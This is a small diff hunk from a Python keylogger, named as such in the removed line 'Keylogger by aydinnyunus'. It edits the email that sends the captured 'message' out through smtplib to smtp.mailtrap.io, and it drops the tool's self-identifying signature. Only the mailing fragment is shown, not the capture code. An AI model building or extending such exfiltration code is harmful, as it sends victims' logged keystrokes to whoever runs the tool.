@@ -67,9 +67,7 @@ finally:
             m = f"""\
             Subject: main Mailtrap
             To: {receiver}
-            From: {sender}
-
-            Keylogger by aydinnyunus\n"""
+            From: {sender}\n"""
 
             m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
